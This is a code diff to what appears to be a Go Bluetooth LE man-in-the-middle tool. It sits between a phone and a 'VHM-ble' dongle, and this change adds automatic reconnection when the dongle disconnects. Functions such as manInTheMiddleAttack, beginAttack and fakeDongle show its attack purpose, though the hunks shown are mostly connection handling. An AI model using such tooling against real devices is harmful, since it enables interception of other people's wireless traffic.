@@ -21,6 +21,8 @@ import (
 
 var isPhoneConnected bool
 var isDongleConnected bool
+var autoConnect bool
+var saveGD gatt.Device
 var publicDataFromPhone []byte
 var publicDataFromDongle []byte
 var tmpDataFromDongle string
@@ -128,7 +130,6 @@ func NewCountTestService() *gatt.Service {
 			case strings.Contains(dataToString, "RV"):
 				x.Write(RV)
 			}*/
-
 		})
 	return s
 }
@@ -309,7 +310,13 @@ func onPeriphDiscovered(p gatt.Peripheral, a *gatt.Advertisement, rssi int) {
 
 func onPeriphDisconnected(p gatt.Peripheral, err error) {
 	fmt.Println("| Dongle is disconnected")
-	close(done)
+	if autoConnect {
+		fmt.Println("Autoconnect is true. Retrying.")
+		isDongleConnected = false	
+		connectToDongle(saveGD)
+	} else {
+		close(done)
+	}
 }
 
 func onStateChanged(d gatt.Device, s gatt.State) {
@@ -341,15 +348,13 @@ func manInTheMiddleAttack(w http.ResponseWriter, r *http.Request) {
 }
 
 func beginAttack() {
-	isPhoneConnected = false
-	isDongleConnected = false
-
 	fmt.Println("| Trying to create gattDevice ...")
 	gattDevice, err := gatt.NewDevice(option.DefaultClientOptions...)
 	if err != nil {
 		log.Fatalf("> Failed to open device, err: %s\n", err)
 		return
 	}
+	saveGD = gattDevice
 	fmt.Println("| gattDevice succesfully created.")
 	fmt.Println("| Trying to capture connection between Raspberry PI with mobile phone ...")
 
@@ -363,9 +368,7 @@ func beginAttack() {
 	fmt.Println("| Trying to capture connection between Raspberry PI with VHM-ble")
 	connectToDongle(gattDevice)
 	//fakeDongle()
-
 }
-
 
 func fakeOutput() {
 	for len(publicDataFromPhone) != 0 {
@@ -417,6 +420,9 @@ func fakeDongle() {
 
 
 func main() {
+	autoConnect = true
+	isPhoneConnected = false
+	isDongleConnected = false
 	cmd := flag.String("autostart", "", "")
 	flag.Parse()
 	if string(*cmd) == "on" {
